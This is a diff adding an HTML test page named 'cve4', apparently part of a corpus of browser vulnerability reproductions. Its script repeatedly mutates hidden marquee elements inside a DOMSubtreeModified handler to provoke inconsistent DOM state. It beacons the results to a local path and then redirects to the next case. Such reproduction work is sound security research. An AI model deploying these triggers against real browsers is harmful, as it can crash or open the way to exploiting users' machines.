@@ -1,0 +1,29 @@
+<!doctype html><meta charset="utf-8"><title>cve4</title>
+<script>
+function b(tag){try{var x=new XMLHttpRequest();x.open('GET','/beacon/'+encodeURIComponent(tag)+'?t='+Date.now(),false);x.send();}catch(e){}}
+b('CVE4-S');
+var ITERS=200, first=null, odd=0, kidsAfter=[];
+for(var i=0;i<ITERS;i++){
+  var m=document.createElement('marquee'); m.style.display='none';
+  var t0=document.createTextNode('a'+i);
+  var h=document.createElement('hr');
+  var u0=document.createTextNode('b'+i);
+  m.appendChild(t0); m.appendChild(h); m.appendChild(u0);
+  document.documentElement.appendChild(m);
+  var armed=true;
+  m.addEventListener('DOMSubtreeModified',function(ev){
+    if(!armed) return; armed=false;
+    try{ if(u0.parentNode===m) m.removeChild(u0); }catch(e){}
+    if(first===null){
+      first='kids='+m.childNodes.length+' ['+Array.prototype.map.call(m.childNodes,function(n){
+        return (n.nodeType===3?('T:'+JSON.stringify(n.data)):n.nodeName); }).join('|')+']';
+    }
+  },false);
+  try{ h.before(h); }catch(e){ odd++; }
+  if(first===null && i===0) first='noevent kids='+m.childNodes.length;
+  document.documentElement.removeChild(m);
+}
+b('CVE4-EV0:'+first);
+b('CVE4-DONE:iters='+ITERS+',odd='+odd);
+setTimeout(function(){ location.replace('/corpus/cve3.html?t=stall&r='+Date.now()); }, 500);
+</script>
